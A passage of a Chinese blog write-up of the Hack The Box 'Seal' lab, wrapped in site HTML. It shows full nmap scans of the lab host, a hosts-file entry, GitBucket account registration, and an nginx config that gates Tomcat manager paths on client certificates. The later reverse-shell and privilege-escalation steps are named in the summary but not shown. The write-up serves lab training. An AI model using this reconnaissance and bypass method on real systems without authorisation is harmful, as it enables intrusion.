@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：nginx配置分析、&#x2F;host-manager&#x2F;html访问绕过、上传war包获取反弹shell、目标用户权限组文件搜索、run.yml文件分析、软连接操作、文件传输、sudo提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Seal-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/21/Seal-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：nginx配置分析、&#x2F;host-manager&#x2F;html访问绕过、上传war包获取反弹shell、目标用户权限组文件搜索、run.yml文件分析、软连接操作、文件传输、sudo提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Seal-htb-writeup/9.png">
+<meta property="article:published_time" content="2024-01-21T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-02-04T09:23:09.565Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Seal-htb-writeup/1.png">
+  
+  
+  
+  <title>Seal-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Seal-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-21 23:50" pubdate>
+          2024年1月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          214 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Seal-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：nginx配置分析、&#x2F;host-manager&#x2F;html访问绕过、上传war包获取反弹shell、目标用户权限组文件搜索、run.yml文件分析、软连接操作、文件传输、sudo提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://www.jgeek.cn/article/117.html</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2021/11/13/htb-seal.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.250</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/tools/portscan]<br>└─$ sudo ./htb-portscan.sh 10.10.10.250 tcp<br>[sudo] kali 的密码：<br>开始对 10.10.10.250 进行nmap端口扫描...<br>* 正在执行tcp协议的端口扫描探测...<br>sudo nmap -min-rate 10000 -p- <span class="hljs-string">&quot;10.10.10.250&quot;</span> -oG <span class="hljs-string">&quot;10.10.10.250&quot;</span>-tcp-braker-allports<br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 20:47 CST<br>Warning: 10.10.10.250 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.250<br>Host is up (0.40s latency).<br>Not shown: 57981 closed tcp ports (reset), 7551 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>443/tcp  open  https<br>8080/tcp open  http-proxy<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 51.18 seconds<br>* 正在对开放的端口进行TCP全连接式版本探测和系统版本以及漏洞探测...<br>sudo nmap -sT -sV -sC -p<span class="hljs-string">&quot;22,443,8080,&quot;</span> <span class="hljs-string">&quot;10.10.10.250&quot;</span><br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 20:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.250<br>Host is up (0.34s latency).<br><br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)<br>|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)<br>|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)<br>443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| tls-nextprotoneg: <br>|_  http/1.1<br>| tls-alpn: <br>|_  http/1.1<br>|_http-title: 400 The plain HTTP request was sent to HTTPS port<br>| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK<br>| Not valid before: 2021-05-05T10:24:03<br>|_Not valid after:  2022-05-05T10:24:03<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>8080/tcp open  http-proxy<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Server returned status 401 but no WWW-Authenticate header.<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html;charset=utf-8).</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   FourOhFourRequest: </span><br><span class="hljs-string">|     HTTP/1.1 401 Unauthorized</span><br><span class="hljs-string">|     Date: Sun, 21 Jan 2024 12:48:42 GMT</span><br><span class="hljs-string">|     Set-Cookie: JSESSIONID=node0joxvqq12yfrlvr6cwt5k9wvw2.node0; Path=/; HttpOnly</span><br><span class="hljs-string">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="hljs-string">|     Content-Type: text/html;charset=utf-8</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 401 Unauthorized</span><br><span class="hljs-string">|     Date: Sun, 21 Jan 2024 12:48:35 GMT</span><br><span class="hljs-string">|     Set-Cookie: JSESSIONID=node0f5iw5xempegh2f6jvm84gi5d0.node0; Path=/; HttpOnly</span><br><span class="hljs-string">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="hljs-string">|     Content-Type: text/html;charset=utf-8</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Sun, 21 Jan 2024 12:48:36 GMT</span><br><span class="hljs-string">|     Set-Cookie: JSESSIONID=node0r3w5lvmxp2on1qtg3ge5m2zz61.node0; Path=/; HttpOnly</span><br><span class="hljs-string">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="hljs-string">|     Content-Type: text/html;charset=utf-8</span><br><span class="hljs-string">|     Allow: GET,HEAD,POST,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character OTEXT=0x80</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 71</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;</span><br><span class="hljs-string">|   RTSPRequest: </span><br><span class="hljs-string">|     HTTP/1.1 505 Unknown Version</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 58</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;</span><br><span class="hljs-string">|   Socks4: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x4</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x4&lt;/pre&gt;</span><br><span class="hljs-string">|   Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x5</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x5&lt;/pre&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/tools/portscan]</span><br><span class="hljs-string">└─$ sudo ./htb-portscan.sh 10.10.10.250 udp</span><br><span class="hljs-string">开始对 10.10.10.250 进行nmap端口扫描...</span><br><span class="hljs-string">* 正在执行udp协议的端口扫描探测...</span><br><span class="hljs-string">sudo nmap -min-rate 10000 -p- -sU &quot;10.10.10.250&quot; -oG &quot;10.10.10.250&quot;-udp-braker-allports</span><br><span class="hljs-string"></span><br><span class="hljs-string">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 20:51 CST</span><br><span class="hljs-string">Warning: 10.10.10.250 giving up on port because retransmission cap hit (10).</span><br><span class="hljs-string">Nmap scan report for 10.10.10.250</span><br><span class="hljs-string">Host is up (0.44s latency).</span><br><span class="hljs-string">All 65535 scanned ports on 10.10.10.250 are in ignored states.</span><br><span class="hljs-string">Not shown: 65492 open|filtered udp ports (no-response), 43 closed udp ports (port-unreach)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 77.30 seconds</span><br><span class="hljs-string">* 正在对开放的端口进行udp式版本探测和系统版本探测...</span><br><span class="hljs-string">sudo nmap -sV -sU -sC -p&quot;&quot; &quot;10.10.10.250&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 20:52 CST</span><br><span class="hljs-string">Error #487: Your port specifications are illegal.  Example of proper form: &quot;-100,200-1024,T:3000-4000,U:60000-&quot;</span><br><span class="hljs-string">QUITTING!</span><br></code></pre></td></tr></table></figure>
+
+<p>3、根据443端口信息情况，绑定下本地的hosts信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.10.250 seal.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.10.250 seal.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、查看下8080端口服务情况</p>
+<p><code>http://seal.htb:8080/signin;jsessionid=node01webv6ysmi13s5xip27hbkvjg34.node0?redirect=%2F</code></p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、注册一个账号</p>
+<p><code>http://seal.htb:8080/register</code></p>
+<p><code>shiyan</code><br><code>shiyan</code><br><code>shiyan@qq.com</code></p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、8080端口登录进去，可以看出是一个 GitBucket 的一个系统平台，这里存在两个项目库：infra 和 seal_market</p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、这个 <code>http://seal.htb:8080/root/seal_market</code> 路径是第一个应用程序，一个简单的网上市场应用程序，提供免费购物，避免在这种流行病的情况下拥挤，节省时间。 </p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、然后通过查看443端口的服务，应该就是这个应用程序</p>
+<p><code>https://seal.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、在翻阅中，还是发现了一些信息的，<code>http://seal.htb:8080/root/seal_market/issues/1</code> ，在这个页面上，其实是发现了2个用户ID的信息，alex 和 luis</p>
+<p><code>我们不能让Tomcat启用相互身份验证吗？</code> </p>
+<p><code>可能，但为了平衡服务器负载，我们建议使用Nginx。</code> </p>
+<p>10、这里去查看下 nginx 的配置信息</p>
+<p><code>http://seal.htb:8080/root/seal_market/blob/master/nginx/sites-enabled/default</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssl_certificate /var/www/keys/selfsigned.crt;<br>ssl_certificate_key /var/www/keys/selfsigned.key;<br>ssl_client_certificate /var/www/keys/selfsigned-ca.crt;<br> <br>server &#123;<br>	listen 443 ssl default_server;<br>	listen [::]:443 ssl default_server;<br> <br>	<span class="hljs-comment"># SSL configuration</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># listen 443 ssl default_server;</span><br>	<span class="hljs-comment"># listen [::]:443 ssl default_server;</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># Note: You should disable gzip for SSL traffic.</span><br>	<span class="hljs-comment"># See: https://bugs.debian.org/773332</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># Read up on ssl_ciphers to ensure a secure configuration.</span><br>	<span class="hljs-comment"># See: https://bugs.debian.org/765782</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># Self signed certs generated by the ssl-cert package</span><br>	<span class="hljs-comment"># Don&#x27;t use them in a production server!</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># include snippets/snakeoil.conf;</span><br> <br>	root /var/www/html;<br>	ssl_protocols TLSv1.1 TLSv1.2;<br>	ssl_verify_client optional;<br>	<br>	<span class="hljs-comment"># Add index.php to the list if you are using PHP</span><br>	index index.html index.htm index.nginx-debian.html;<br> <br>	server_name _;<br> <br>	location /manager/html &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$ssl_client_verify</span> != SUCCESS) &#123;<br>			<span class="hljs-built_in">return</span> 403;<br>		&#125;<br>		proxy_set_header        Host <span class="hljs-variable">$host</span>;<br>		proxy_set_header        X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>		proxy_set_header        X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>		proxy_set_header        X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;<br>		proxy_pass          http://localhost:8000;<br>		proxy_read_timeout  90;<br>		proxy_redirect      http://localhost:8000 https://0.0.0.0;<br>		<span class="hljs-comment"># First attempt to serve request as file, then</span><br>		<span class="hljs-comment"># as directory, then fall back to displaying a 404.</span><br><span class="hljs-comment">#		try_files $uri $uri/ =404;</span><br>	&#125;<br> <br> <br>	location /admin/dashboard &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$ssl_client_verify</span> != SUCCESS) &#123;<br>			<span class="hljs-built_in">return</span> 403;<br>		&#125;<br>		proxy_set_header        Host <span class="hljs-variable">$host</span>;<br>		proxy_set_header        X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>		proxy_set_header        X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>		proxy_set_header        X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;<br>		proxy_pass          http://localhost:8000;<br>		proxy_read_timeout  90;<br>		proxy_redirect      http://localhost:8000 https://0.0.0.0;<br>		<span class="hljs-comment"># First attempt to serve request as file, then</span><br>		<span class="hljs-comment"># as directory, then fall back to displaying a 404.</span><br><span class="hljs-comment">#		try_files $uri $uri/ =404;</span><br>	&#125;<br> <br>        location /host-manager/html &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ssl_client_verify</span> != SUCCESS) &#123;<br>                        <span class="hljs-built_in">return</span> 403;<br>                &#125;<br>                proxy_set_header        Host <span class="hljs-variable">$host</span>;<br>                proxy_set_header        X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>                proxy_set_header        X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>                proxy_set_header        X-Forwarded-Proto <span 